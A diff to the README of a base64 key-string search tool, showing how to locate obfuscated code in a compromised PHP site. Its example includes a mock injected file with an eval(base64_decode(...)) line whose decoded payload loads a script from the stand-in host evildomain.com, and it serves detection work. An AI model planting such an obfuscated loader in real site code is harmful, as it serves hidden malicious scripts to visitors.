@@ -26,11 +26,26 @@ aGlzIGZpbGUgd2FzIHBpcGVkIHRvIHN0ZGlu
 
 ### Examples
 
-Test to see if a call to "evildomain.com/malware.js" is present in the following obfuscated file:
+We can use it to tackle an example problem: Finding a string in an obfuscated PHP file.
+
+Our company's imaginary website is serving malicious javascript to our users! The script is being sourced from evildomain.com/malware.js. We're running a pretty big framework so it's not trivial to identify the file it's coming from, and searching our files for that address turned up empty. Let's see if it's been base64-encoded.
+
+```
+$ base64-keystrings.py "evildomain.com/malware.js" 
+ZXZpbGRvbWFpbi5jb20vbWFsd2FyZS5q 
+aWxkb21haW4uY29tL21hbHdhcmUu 
+dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz 
+
+$ grep -ro -e "ZXZpbGRvbWFpbi5jb20vbWFsd2FyZS5q" -e "aWxkb21haW4uY29tL21hbHdhcmUu" -e "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" public_html/
+./public_html/includes/media/badfile.php:dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz 
+```
+
+Searching for our three key strings in public_html/ turned up the culprit: ./public_html/includes/media/badfile.php!
 
 ```php
 <?php
 /* 
+ * badfile.php
  * Totally Legit PHP File
  * Version 1.1
  * 
@@ -42,21 +57,7 @@ Test to see if a call to "evildomain.com/malware.js" is present in the following
  eval(base64_decode(Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7));
 ```
 
-```
-$ base64-keystrings.py "evildomain.com/malware.js"
-ZXZpbGRvbWFpbi5jb20vbWFsd2FyZS5q
-aWxkb21haW4uY29tL21hbHdhcmUu
-dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz
-
-$ grep "ZXZpbGRvbWFpbi5jb20vbWFsd2FyZS5q" badfile.txt
-
-$ grep "aWxkb21haW4uY29tL21hbHdhcmUu" badfile.txt
-
-$ grep "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" badfile.txt
-eval(base64_decode(Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7));
-```
-
-As we can see, the string "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" was identified in the file! Applied against a large PHP framework where a code injection could be in a huge assortment of locations, recursive searches could be performed with the generated key strings to assist in locating obfuscated code. 
+As we can see, the string "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" was identified in the file.
 
 ### Upcoming Features
 - [ ] Add file search features to the script so manual grepping is no longer required
